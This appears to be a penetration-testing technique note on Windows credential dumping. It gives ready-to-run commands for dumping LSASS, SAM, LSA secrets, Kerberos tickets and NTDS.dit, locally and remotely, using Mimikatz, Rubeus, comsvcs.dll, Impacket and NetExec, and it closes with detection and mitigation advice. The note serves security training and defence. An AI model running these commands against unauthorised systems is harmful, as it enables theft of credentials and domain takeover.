---
tags:
  - "#type/technique"
  - "#tactic/TA0006"
  - "#technique/T1003"
  - "#stage/credential-access"
  - "#os/windows"
  - "#tool/mimikatz"
  - "#tool/rubeus"
  - "#tool/impacket"
  - "#tool/netexec"
  - "#tool/pypykatz"
aliases:
  - Credential Extraction
  - LSASS Dumping
  - SAM Dumping
  - NTDS Extraction
  - Memory Credential Extraction
---

## Technique
___

Credential Dumping involves extracting credential material from various sources on a Windows system, including:

1. **LSASS Memory**: The Local Security Authority Subsystem Service (LSASS) process stores credentials in memory, including plaintext passwords, NTLM hashes, and Kerberos tickets.

2. **SAM Database**: The Security Account Manager (SAM) database stores local user account credentials.

3. **NTDS.dit**: The Active Directory database file containing domain user credentials.

4. **Kerberos Tickets**: Authentication tickets cached in memory or on disk.

These extracted credentials can be used for lateral movement, privilege escalation, and persistence in an environment.

## Prerequisites
___

**Access Level:** 
- For local credential dumping: Local administrator privileges on the target system
- For domain credential dumping (NTDS.dit): Domain Administrator privileges or local administrator access to a Domain Controller

**System State:** Target system must be accessible and the relevant services must be running.

## Local Credential Dumping
___

### Using Mimikatz

**Dump credentials from LSASS memory:**
```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

Output to file:
```powershell
.\mimikatz.exe "log C:\path\to\mimikatz.log" "privilege::debug" "sekurlsa::logonpasswords" "log" "exit"
```
or
```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit > C:\path\to\mimi-output.txt
```

**Dump SAM database (local credentials):**
```powershell
.\mimikatz.exe "privilege::debug" "lsadump::sam /patchlsadsu" exit
```

**Dump LSA secrets (on a Domain Controller):**
```powershell
.\mimikatz.exe "privilege::debug" "lsadump::lsa /patch" exit
```

**Target krbtgt account (for golden ticket creation):**
```powershell
.\mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt" exit
```

### Using Rubeus for Kerberos Tickets

**List cached tickets:**
```powershell
# Non-elevated: Lists current user's tickets
# Elevated: Lists everyone's tickets
Rubeus.exe triage
```

**Specify a service to filter tickets:**
```powershell
Rubeus.exe triage /service:ldap
```

**Dump tickets:**
```powershell
# Non-elevated: Dumps current user's tickets
Rubeus.exe dump

# Elevated: Dumps all tickets by targeting krbtgt
Rubeus.exe dump /service:krbtgt
```

### Alternative Methods

**Save registry hives and extract locally:**
```powershell
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

Then extract credentials using Impacket:
```bash
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```

**Dump LSASS with Task Manager:**
1. Open Task Manager
2. Select the Processes tab
3. Find & right-click the Local Security Authority Process
4. Select "Create dump file"

The dump file will be saved to:
```
C:\Users\<username>\AppData\Local\Temp\lsass.DMP
```

**Rundll32.exe & Comsvcs.dll Method:**

Get LSASS PID:
```cmd
tasklist /svc
```
or
```powershell
Get-Process lsass
```

Create dump file with rundll32:
```powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

Extract credentials with Pypykatz:
```bash
pypykatz lsa minidump lsass.dmp
```

### NTDS.dit Dumping

**Using Volume Shadow Copy:**
```cmd
vssadmin CREATE SHADOW /For=C:
```

Copying NTDS.dit from the shadow copy:
```cmd
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

Extract credentials with Impacket:
```bash
impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local
```

## Remote Credential Dumping
___

### Using NetExec

**Dump LSA secrets:**
```bash
nxc smb 10.129.42.198 -u 'username' -p 'password' --local-auth --lsa
```

**Dump SAM database:**
```bash
nxc smb 10.129.42.198 -u 'username' -p 'password' --local-auth --sam
```

**Dump NTDS.dit:**
```bash
nxc smb 10.129.201.57 -u 'username' -p 'password' --ntds
```

### Using Impacket

**Dump everything remotely:**
```bash
impacket-secretsdump 'domain.local'/'username':'password'@'IP' -dc-ip <DCIP>
```

## Detection & Mitigation
___

### Detection

- Monitor for process access to LSASS (Event ID 4656, 4663)
- Watch for creation of memory dump files
- Monitor for suspicious use of rundll32.exe with comsvcs.dll
- Look for Mimikatz-like activity (memory pattern matching)
- Monitor for registry save operations on SAM, SYSTEM, SECURITY hives
- Watch for Volume Shadow Copy creation on Domain Controllers

### Mitigation

- Implement credential guard to protect LSASS memory
- Use Protected Process Light (PPL) for LSASS
- Restrict local administrator access
- Implement Just-In-Time (JIT) administration for privileged access
- Configure Windows Defender Credential Guard (for compatible systems)
- Implement Attack Surface Reduction (ASR) rules
- Ensure proper patch management
- Use strong passwords that resist offline cracking
- Implement network segmentation to limit lateral movement capabilities